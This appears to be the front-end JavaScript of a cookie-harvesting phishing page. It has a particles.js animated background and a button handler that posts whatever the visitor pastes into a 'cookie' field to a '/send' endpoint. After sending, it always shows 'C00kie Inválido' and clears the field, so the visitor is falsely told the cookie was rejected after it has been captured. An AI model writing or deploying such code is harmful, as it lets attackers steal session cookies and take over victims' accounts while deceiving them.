particlesJS("particles-js", {
  "particles": {
    "number": { "value": 80 },
    "color": { "value": "#00dbde" },
    "shape": { "type": "circle" },
    "opacity": { "value": 0.5, "random": true },
    "size": { "value": 3, "random": true },
    "line_linked": { "enable": true, "distance": 150, "color": "#00dbde", "opacity": 0.4, "width": 1 },
    "move": { "enable": true, "speed": 2 }
  },
  "interactivity": {
    "detect_on": "canvas",
    "events": { "onhover": { "enable": true, "mode": "repulse" } }
  }
});

document.getElementById("sendBtn").addEventListener("click", async () => {
  const cookie = document.getElementById("cookieInput").value.trim();
  const status = document.getElementById("status");

  if (!cookie) return;

  status.textContent = "";

  await fetch("/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cookie })
  });

  status.textContent = "C00kie Inválido";
  document.getElementById("cookieInput").value = "";
});
